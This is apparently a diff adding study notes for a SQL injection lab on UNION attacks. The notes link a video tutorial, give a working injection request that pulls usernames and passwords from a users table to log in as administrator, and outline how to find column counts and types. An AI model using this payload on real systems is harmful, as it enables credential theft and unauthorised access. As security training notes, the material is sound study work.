@@ -1,2 +1,17 @@
 SQL Injection Union Attack - Retrieving data from other tables.
 https://www.youtube.com/watch?v=4sBdD6I7fZI&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=6
+
+Goal: Retrieves all usernames and passwords from table users, and use the information to log in as the administrator user. 
+
+
+
+Solution: GET /filter?category=Corporate+gifts'+UNION+SELECT+Username,Password+FROM+users--
+
+Analysis:
+---------
+1) Determine # of columns
+ - Group By ...
+ - UNION SELECT NULL...
+
+2) Determine data types of columns
+- Itterate through number of columns and pass string value.
